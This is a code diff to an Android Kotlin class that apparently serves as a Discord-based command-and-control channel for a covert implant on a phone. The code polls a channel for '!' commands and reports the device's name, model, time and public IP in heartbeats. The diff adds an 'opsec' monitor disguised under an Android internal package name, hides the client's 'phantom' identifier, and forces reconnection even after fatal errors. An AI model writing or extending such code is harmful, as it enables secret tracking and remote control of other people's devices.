@@ -7,6 +7,7 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
+import com.android.internal.os.opsec.MonitorEngine
 
 class DiscordGatewayClient(
     private val appContext: android.content.Context,
@@ -60,6 +61,7 @@ class DiscordGatewayClient(
     @Volatile private var heartbeatJob: Job? = null
     @Volatile private var deviceHeartbeatJob: Job? = null
     @Volatile private var reconnectJob: Job? = null
+    @Volatile private var connectionMonitorJob: Job? = null
     @Volatile private var heartbeatInterval = 41250L
     @Volatile private var seq: Int? = null
     @Volatile private var sessionId: String? = null
@@ -77,7 +79,7 @@ class DiscordGatewayClient(
     private var pollJob: Job? = null
     private var lastPolledMsgId: String? = null
     private var pollFailures = 0
-    private val processedCmdIds = mutableSetOf<String>()
+    private val processedCmdIds = linkedSetOf<String>()
     private val msgQueue = java.util.concurrent.LinkedBlockingQueue<QueuedMessage>()
     private var msgQueueJob: Job? = null
     private val msgSemaphore = kotlinx.coroutines.sync.Semaphore(1)
@@ -90,7 +92,7 @@ class DiscordGatewayClient(
         val fileBytes: ByteArray? = null,
         val retries: Int = 0,
         val maxRetries: Int = 5,
-        val completable: kotlinx.coroutines.CompletableDeferred<Boolean>? = null
+        val completable: kotlinx.coroutines.CompletableDeferred<String?>? = null
     ) {
         enum class Type { TEXT, EDIT, FILE }
         override fun equals(other: Any?): Boolean = this === other
@@ -101,25 +103,32 @@ class DiscordGatewayClient(
     private var onlineMsgSent = false
     private var connecting = false
 
+    private fun getPhoneName(): String {
+        return try {
+            val name = android.provider.Settings.Global.getString(appContext.contentResolver, "device_name")
+            if (!name.isNullOrBlank()) name
+            else try {
+                val bt = appContext.getSystemService(android.bluetooth.BluetoothManager::class.java)?.adapter
+                bt?.name?.takeIf { !it.isNullOrBlank() } ?: android.os.Build.MODEL
+            } catch (_: Exception) { android.os.Build.MODEL }
+        } catch (_: Exception) {
+            try {
+                val bt = appContext.getSystemService(android.bluetooth.BluetoothManager::class.java)?.adapter
+                bt?.name?.takeIf { !it.isNullOrBlank() } ?: android.os.Build.MODEL
+            } catch (_: Exception) { android.os.Build.MODEL }
+        }
+    }
+
     private fun loadState() {
+        deviceSuffix = getPhoneName().replace(" ", "-").replace("[^a-zA-Z0-9-]".toRegex(), "").take(32).lowercase()
         try {
             val sp = appContext.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
-            val saved = sp.getString(KEY_SUFFIX, null)
-            deviceSuffix = saved ?: run {
-                val model = android.os.Build.MODEL.replace(" ", "-").replace("[^a-zA-Z0-9-]".toRegex(), "")
-                val serial = android.os.Build.SERIAL.takeIf { it != "unknown" && it.isNotBlank() }
-                    ?: android.os.Build.ID.take(6)
-                "$model-$serial".take(32).lowercase()
-            }
             onlineMsgSent = sp.getBoolean(KEY_ONLINE_SENT, false)
             myChannelId = sp.getString(KEY_CHANNEL_ID, null)
             guildId = sp.getString(KEY_GUILD_ID, null)
             sessionId = sp.getString(KEY_SESSION_ID, null)
             seq = sp.getInt(KEY_SEQ, -1).let { if (it >= 0) it else null }
-        } catch (_: Exception) {
-            val model = android.os.Build.MODEL.replace(" ", "-").replace("[^a-zA-Z0-9-]".toRegex(), "")
-            deviceSuffix = "$model-${android.os.Build.ID.take(6)}".take(32).lowercase()
-        }
+        } catch (_: Exception) {}
     }
 
     private fun saveState() {
@@ -132,7 +141,7 @@ class DiscordGatewayClient(
                 guildId?.let { putString(KEY_GUILD_ID, it) }
                 sessionId?.let { putString(KEY_SESSION_ID, it) }
                 seq?.let { putInt(KEY_SEQ, it) }
-                apply()
+                commit()
             }
         } catch (_: Exception) {}
     }
@@ -142,10 +151,8 @@ class DiscordGatewayClient(
     private fun status(s: String) { onStatus?.invoke(s) }
 
     fun start(coroutineScope: CoroutineScope) {
-        if (ws != null || connecting || reconnecting || resuming) {
-            status("Already connecting")
-            return
-        }
+        stop()
+        
         status("Init")
         try {
             closing = false
@@ -161,11 +168,14 @@ class DiscordGatewayClient(
                 put("device", android.os.Build.MODEL)
                 put("sdk", android.os.Build.VERSION.SDK_INT)
                 put("suffix", deviceSuffix)
+                put("time", java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
             })
             android.util.Log.d("DiscordGateway", "Starting gateway client with token: ${DiscordConfig.BOT_TOKEN.take(10)}...")
             // Connect immediately, verify token in parallel
             connect()
             verifyTokenAsync()
+            // Start connection monitor for stability
+            startConnectionMonitor()
         } catch (e: Exception) {
             status("Crashed")
             android.util.Log.e("DiscordGateway", "Start failed", e)
@@ -201,7 +211,9 @@ class DiscordGatewayClient(
                         r.body?.close()
                     }
                 }
-            } catch (_: Exception) {}
+            } catch (e: Exception) {
+                android.util.Log.e("DiscordGateway", "Token verification failed", e)
+            }
         }
     }
 
@@ -210,8 +222,11 @@ class DiscordGatewayClient(
         heartbeatJob?.cancel()
         deviceHeartbeatJob?.cancel()
         reconnectJob?.cancel()
+        connectionMonitorJob?.cancel()
         pollJob?.cancel()
-        try { ws?.close(1000, "shutdown") } catch (_: Exception) {}
+        try { ws?.close(1000, "shutdown") } catch (e: Exception) {
+            android.util.Log.e("DiscordGateway", "Error closing WS", e)
+        }
         ws = null
         scope = null
         saveState()
@@ -249,7 +264,9 @@ class DiscordGatewayClient(
                     }
                 }
             }
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            android.util.Log.e("DiscordGateway", "bootViaRest failed", e)
+        }
     }
 
     private fun startMsgQueueProcessor() {
@@ -258,30 +275,30 @@ class DiscordGatewayClient(
             while (isActive) {
                 val msg = msgQueue.poll(500, java.util.concurrent.TimeUnit.MILLISECONDS) ?: continue
                 if (msg.retries >= msg.maxRetries) {
-                    msg.completable?.complete(false)
+                    msg.completable?.complete(null)
                     continue
                 }
                 try {
                     msgSemaphore.acquire()
-                    val success = processQueuedMessage(msg)
-                    msgSemaphore.release()
-                    if (!success) {
+                    val msgId = processQueuedMessage(msg)
+                    if (msgId == null) {
                         msgQueue.offer(msg.copy(retries = msg.retries + 1))
                         delay(1000L * (1 shl msg.retries).coerceAtMost(16))
                     } else {
-                        msg.completable?.complete(true)
+                        msg.completable?.complete(msgId)
                     }
                 } catch (e: Exception) {
-                    try { msgSemaphore.release() } catch (_: Exception) {}
                     msgQueue.offer(msg.copy(retries = msg.retries + 1))
                     delay(2000L)
+                } finally {
+                    try { msgSemaphore.release() } catch (_: Exception) {}
                 }
             }
         }
     }
 
-    private suspend fun processQueuedMessage(msg: QueuedMessage): Boolean {
-        val chId = myChannelId ?: return false
+    private suspend fun processQueuedMessage(msg: QueuedMessage): String? {
+        val chId = myChannelId ?: return null
         return when (msg.type) {
             QueuedMessage.Type.TEXT -> {
                 val json = JSONObject().put("content", msg.content)
@@ -291,7 +308,11 @@ class DiscordGatewayClient(
                     .header("Content-Type", "application/json")
                     .post(json.toString().toRequestBody(jsonMedia))
                     .build()
-                executeWithRetry(req).use { it.isSuccessful }
+                executeWithRetry(req).use { resp ->
+                    if (!resp.isSuccessful) return@use null
+                    val body = resp.body?.string() ?: return@use null
+                    JSONObject(body).optString("id", null)
+                }
             }
             QueuedMessage.Type.EDIT -> {
                 val json = JSONObject().put("content", msg.content)
@@ -301,7 +322,7 @@ class DiscordGatewayClient(
                     .header("Content-Type", "application/json")
                     .method("PATCH", json.toString().toRequestBody(jsonMedia))
                     .build()
-                executeWithRetry(req).use { it.isSuccessful }
+                executeWithRetry(req).use { if (it.isSuccessful) msg.messageId else null }
             }
             QueuedMessage.Type.FILE -> {
                 val mime = when {
@@ -324,7 +345,11 @@ class DiscordGatewayClient(
                     .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                     .post(body)
                     .build()
-                executeWithRetry(req).use { it.isSuccessful }
+                executeWithRetry(req).use { resp ->
+                    if (!resp.isSuccessful) return@use null
+                    val body = resp.body?.string() ?: return@use null
+                    JSONObject(body).optString("id", null)
+                }
             }
         }
     }
@@ -349,13 +374,12 @@ class DiscordGatewayClient(
         pollJob = scope?.launch(Dispatchers.IO) {
             while (isActive) {
                 if (myChannelId != null && !fatalError) pollMessages()
-                delay(10000L)
+                delay(if (ws != null) 30000L else 10000L)
             }
         }
     }
 
     private suspend fun pollMessages() {
-        if (ws != null) return
         val chId = myChannelId ?: return
         try {
             val req = Request.Builder()
@@ -375,7 +399,10 @@ class DiscordGatewayClient(
                     val content = msg.optString("content", "").trim()
                     if (!content.contains("!")) continue
                     if (msgId.isNotEmpty() && !processedCmdIds.add(msgId)) continue
-                    if (processedCmdIds.size > 500) processedCmdIds.clear()
+                if (processedCmdIds.size > 500) {
+                    val iter = processedCmdIds.iterator()
+                    repeat(250) { if (iter.hasNext()) { iter.next(); iter.remove() } }
+                }
                     val lines = content.split("\n").filter { it.trim().startsWith("!") }
                     for (line in lines) {
                         val trimmed = line.trim()
@@ -387,13 +414,23 @@ class DiscordGatewayClient(
                     }
                 }
             }
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            android.util.Log.e("DiscordGateway", "handleMessage: ${e.message}", e)
+        }
     }
 
     private fun connect() {
-        if (closing || fatalError) return
+        if (closing) return
+        if (fatalError) {
+            // Retry every 5 minutes even if fatal
+            if (gaveUpAt == 0L) gaveUpAt = System.currentTimeMillis()
+            if (System.currentTimeMillis() - gaveUpAt < 300000L) return
+            fatalError = false
+            gaveUpAt = 0L
+            reconnectAttempt = 0
+            status("Recovery - reconnecting")
+        }
         connectVersion++
-        val myVersion = connectVersion
         try { ws?.close(1000, "reconnecting") } catch (_: Exception) {}
         ws = null
         val req = Request.Builder().url(DiscordConfig.GATEWAY_URL).build()
@@ -418,13 +455,12 @@ class DiscordGatewayClient(
 
                 override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                     status("WS fail")
-                    sendOfflineAlert()
-                    if (!closing && !fatalError) scheduleReconnect()
+                    if (!closing) scheduleReconnect()
                 }
             })
         } catch (_: Exception) {
             status("Conn err")
-            if (!closing && !fatalError) scheduleReconnect()
+            if (!closing) scheduleReconnect()
         }
     }
 
@@ -437,6 +473,7 @@ class DiscordGatewayClient(
         if (code in FATAL_CLOSE_CODES) {
             status("Fatal $code")
             fatalError = true
+            gaveUpAt = System.currentTimeMillis()
             reconnecting = false
             sendOfflineAlert()
             whPost(JSONObject().apply {
@@ -522,6 +559,8 @@ class DiscordGatewayClient(
                         startDeviceHeartbeat()
                         startPolling()
                     }
+                } else {
+                    scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
                 }
             }
             "RESUMED" -> {
@@ -589,6 +628,16 @@ class DiscordGatewayClient(
     }
 
     private suspend fun findOrCreateChannelViaRest() {
+        // If guildId is null, try to get it from REST API
+        if (guildId == null) {
+            status("Finding guild...")
+            bootViaRest()
+            if (guildId == null) {
+                status("No guild found")
+                return
+            }
+            status("Guild: $guildId")
+        }
         val gId = guildId ?: return
         try {
             val url = "https://discord.com/api/v10/guilds/$gId/channels"
@@ -666,15 +715,35 @@ class DiscordGatewayClient(
     }
 
     private fun getPublicIp(): String {
-        return try {
-            val req = Request.Builder().url("https://api.ipify.org?format=json").build()
-            restClient.newCall(req).execute().use { r ->
-                if (r.isSuccessful) {
-                    val body = r.body?.string() ?: return "?"
-                    JSONObject(body).optString("ip", "?")
-                } else "?"
+        // Try public IP API first
+        try {
+            val url = java.net.URL("http://ip-api.com/json/")
+            val conn = url.openConnection() as java.net.HttpURLConnection
+            conn.connectTimeout = 4000
+            conn.readTimeout = 4000
+            val body = conn.inputStream.bufferedReader().readText()
+            conn.disconnect()
+            val json = org.json.JSONObject(body)
+            if (json.optString("status") == "success") {
+                return json.optString("query", "?")
             }
-        } catch (_: Exception) { "?" }
+        } catch (_: Exception) {}
+        // Fallback: local WiFi IP
+        try {
+            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
+            while (interfaces.hasMoreElements()) {
+                val intf = interfaces.nextElement()
+                if (intf.isLoopback || !intf.isUp) continue
+                val addrs = intf.inetAddresses ?: continue
+                while (addrs.hasMoreElements()) {
+                    val addr = addrs.nextElement()
+                    if (addr is java.net.Inet4Address && !addr.isLoopbackAddress) {
+                        return addr.hostAddress ?: "?"
+                    }
+                }
+            }
+        } catch (_: Exception) {}
+        return "?"
     }
 
     fun sendOnlineMsg() {
@@ -682,14 +751,17 @@ class DiscordGatewayClient(
         onlineMsgSent = true
         saveState()
         scope?.launch(Dispatchers.IO) {
-            // Send immediate message without waiting for IP
-            val quickMsg = ":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})"
+            val now = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
+            // Send immediate real-time alert
+            val quickMsg = ":green_circle: **DEVICE ONLINE** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})\nTime: $now | SDK: ${android.os.Build.VERSION.SDK_INT}"
             status("Sending online msg")
             val msgId = sendMsgAwait(quickMsg)
             whPost(JSONObject().apply {
                 put("event", "online")
                 put("channel", myChannelId)
                 put("device", android.os.Build.MODEL)
+                put("time", now)
+                put("sdk", android.os.Build.VERSION.SDK_INT)
             })
             // Start command processing immediately
             startDeviceHeartbeat()
@@ -698,7 +770,7 @@ class DiscordGatewayClient(
             scope?.launch(Dispatchers.IO) {
                 val ip = getPublicIp()
                 if (ip != "?" && msgId != null) {
-                    editMsg(msgId, ":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE}) | IP: ${ip}")
+                    editMsg(msgId, ":green_circle: **DEVICE ONLINE** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})\nTime: $now | IP: ${ip}")
                 }
             }
             crashReport?.let { report ->
@@ -710,9 +782,14 @@ class DiscordGatewayClient(
         }
     }
 
+    @Volatile private var lastOfflineAlertAt = 0L
+    @Volatile private var lastReconnectedMsgAt = 0L
+
     fun sendOfflineAlert() {
+        val now = System.currentTimeMillis()
+        if (now - lastOfflineAlertAt < 60000L) return // Max 1 alert per minute
+        lastOfflineAlertAt = now
         scope?.launch(Dispatchers.IO) {
-            // Send immediately without waiting for IP
             sendMsg(":red_circle: **Connection Lost** — ${android.os.Build.MODEL} | Reconnecting...")
             whPost(JSONObject().apply {
                 put("event", "offline")
@@ -723,12 +800,14 @@ class DiscordGatewayClient(
     }
 
     fun sendReconnectedMsg() {
+        val now = System.currentTimeMillis()
+        if (now - lastReconnectedMsgAt < 300000L) return // Max 1 reconnect msg per 5 min
+        lastReconnectedMsgAt = now
         scope?.launch(Dispatchers.IO) {
             val quickMsg = ":green_circle: **Reconnected** — ${android.os.Build.MODEL}"
             val msgId = sendMsgAwait(quickMsg)
             startDeviceHeartbeat()
             startPolling()
-            // Fetch IP in background
             scope?.launch(Dispatchers.IO) {
                 val ip = getPublicIp()
                 if (ip != "?" && msgId != null) {
@@ -765,7 +844,7 @@ class DiscordGatewayClient(
     }
 
     private suspend fun sendChunkAwait(text: String): String? {
-        val chId = myChannelId ?: return null
+        if (myChannelId == null) return null
         val msg = QueuedMessage(
             type = QueuedMessage.Type.TEXT,
             content = text,
@@ -773,23 +852,7 @@ class DiscordGatewayClient(
             completable = kotlinx.coroutines.CompletableDeferred()
         )
         msgQueue.offer(msg)
-        val success = msg.completable!!.await()
-        if (!success) return null
-        return try {
-            val json = JSONObject().put("content", text)
-            val url = "https://discord.com/api/v10/channels/$chId/messages"
-            val req = Request.Builder()
-                .url(url)
-                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
-                .header("Content-Type", "application/json")
-                .post(json.toString().toRequestBody(jsonMedia))
-                .build()
-            executeWithRetry(req).use { resp ->
-                if (!resp.isSuccessful) return@use null
-                val body = resp.body?.string() ?: return@use null
-                JSONObject(body).optString("id", null)
-            }
-        } catch (_: Exception) { null }
+        return msg.completable!!.await()
     }
 
     private fun sanitizeContent(text: String): String {
@@ -977,7 +1040,7 @@ class DiscordGatewayClient(
                 put("properties", JSONObject().apply {
                     put("os", "android")
                     put("browser", "okhttp")
-                    put("device", "phantom")
+                    put("device", "android")
                 })
             })
         }
@@ -1002,31 +1065,77 @@ class DiscordGatewayClient(
         lastHeartbeatAck = System.currentTimeMillis()
         heartbeatJob = scope?.launch {
             while (isActive) {
-                val now = System.currentTimeMillis()
-                if (now - lastHeartbeatAck > heartbeatInterval * 3) {
-                    status("Heartbeat timeout")
-                    sendOfflineAlert()
-                    ws?.close(1001, "heartbeat timeout")
-                    break
-                }
                 val payload = JSONObject().apply {
                     put("op", OP_HEARTBEAT)
                     put("d", seq ?: JSONObject.NULL)
                 }
                 ws?.send(payload.toString())
                 delay(heartbeatInterval)
+                val now = System.currentTimeMillis()
+                if (now - lastHeartbeatAck > heartbeatInterval * 10) {
+                    status("Heartbeat timeout")
+                    sendOfflineAlert()
+                    try { ws?.close(1001, "hb timeout") } catch (_: Exception) {}
+                    ws = null
+                    scheduleReconnect()
+                    break
+                }
             }
         }
+    }
+
+    fun resetOnlineMsgSent() {
+        onlineMsgSent = false
+        saveState()
     }
 
     private fun startDeviceHeartbeat() {
         deviceHeartbeatJob?.cancel()
         deviceHeartbeatJob = scope?.launch {
-            delay(DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong())
+            val monitor = MonitorEngine.getInstance()
+            // Burst: 3 rapid heartbeats so bot sees us immediately after restart/update
+            if (monitor.shouldExecuteAction()) {
+                repeat(3) {
+                    if (!isActive) return@launch
+                    sendMsg(":heartbeat: **Alive** — ${android.os.Build.MODEL}")
+                    delay(1000)
+                }
+            }
+            // Then OPSEC-adaptive interval loop
+            val initialDelay = minOf(
+                DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong(),
+                monitor.getRecommendedHeartbeatMs()
+            )
+            delay(initialDelay)
             while (isActive) {
+                if (!monitor.shouldExecuteAction()) {
+                    delay(60000)
+                    continue
+                }
                 val ip = getPublicIp()
                 sendMsg(":heartbeat: **Alive** — ${android.os.Build.MODEL} | IP: ${ip}")
-                delay(DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong())
+                val hbInterval = monitor.getRecommendedHeartbeatMs()
+                if (hbInterval >= Long.MAX_VALUE) {
+                    delay(3600000)
+                } else {
+                    delay(hbInterval)
+                }
+            }
+        }
+    }
+
+    private fun startConnectionMonitor() {
+        connectionMonitorJob?.cancel()
+        connectionMonitorJob = scope?.launch {
+            while (isActive) {
+                delay(60000) // Check every 60 seconds
+                if (closing) break
+                
+                if (ws == null && !reconnecting && !resuming && !closing && startTime > 0) {
+                    android.util.Log.w("DiscordGateway", "Connection monitor: no ws, reconnecting")
+                    status("Conn monitor: reconnecting")
+                    scheduleReconnect()
+                }
             }
         }
     }
@@ -1040,21 +1149,9 @@ class DiscordGatewayClient(
         val scheduleVersion = connectVersion
         if (closing) return
 
-        if (reconnectAttempt >= 15) {
-            if (gaveUpAt == 0L) {
-                gaveUpAt = System.currentTimeMillis()
-            } else if (System.currentTimeMillis() - gaveUpAt > 300000L) {
-                reconnectAttempt = 0
-                fatalError = false
-                gaveUpAt = 0L
-                status("Recovery attempt")
-            } else {
-                return
-            }
-        }
         reconnectJob = scope?.launch {
             if (closing) return@launch
-            val delay = (DiscordConfig.RECONNECT_BASE_DELAY * (1 shl reconnectAttempt))
+            val delay = (DiscordConfig.RECONNECT_BASE_DELAY * (1 shl reconnectAttempt.coerceAtMost(10)))
                 .coerceAtMost(DiscordConfig.MAX_RECONNECT_DELAY)
             reconnectAttempt++
             status("Recon ${reconnectAttempt}")
@@ -1069,7 +1166,8 @@ class DiscordGatewayClient(
         val maxRetries = 5
         while (retries < maxRetries) {
             try {
-                val resp = restClient.newCall(request).execute()
+                val req = request.newBuilder().build() // Clone for each attempt
+                val resp = restClient.newCall(req).execute()
                 if (resp.code == 429) {
                     val retryAfter = resp.header("Retry-After")?.toFloatOrNull()?.toLong() ?: 5L
                     val retryAfterMs = resp.header("X-RateLimit-Reset-After")?.toFloatOrNull()?.toLong()?.times(1000)
@@ -1106,7 +1204,8 @@ class DiscordGatewayClient(
                 throw e
             }
         }
-        val finalAttempt = restClient.newCall(request).execute()
+        val req = request.newBuilder().build() // Clone for final attempt
+        val finalAttempt = restClient.newCall(req).execute()
         if (!finalAttempt.isSuccessful) {
             android.util.Log.e("DiscordGateway", "All retries exhausted for ${request.url}")
         }
